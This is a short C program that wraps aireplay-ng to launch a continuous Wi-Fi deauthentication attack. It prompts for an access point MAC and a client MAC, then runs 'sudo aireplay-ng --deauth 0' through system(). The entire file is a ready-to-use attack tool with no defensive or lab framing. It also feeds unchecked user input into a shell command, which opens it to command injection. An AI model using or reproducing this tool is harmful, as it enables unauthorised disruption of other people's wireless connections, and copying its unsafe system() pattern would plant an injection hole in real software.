#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
  char ap_mac[18];
  char station_mac[18];
  char command[256];
  const char *iface = "wlan0mon"; // Replace with your wireless interface in
                                  // monitor mode (e.g., wlan0mon)

  // Get the AP MAC address
  printf("Enter the Access Point (AP) MAC address (e.g., AA:BB:CC:DD:EE:FF): ");
  scanf("%17s", ap_mac);

  // Get the Station MAC address
  printf("Enter the Station (Client) MAC address (e.g., 11:22:33:44:55:66): ");
  scanf("%17s", station_mac);

  // Construct the deauth attack command
  snprintf(command, sizeof(command),
           "sudo aireplay-ng --deauth 0 -a %s -c %s %s", ap_mac, station_mac,
           iface);

  // Start the deauth attack
  printf("Starting deauth attack on Station %s via Access Point %s...\n",
         station_mac, ap_mac);
  system(command);

  return 0;
}
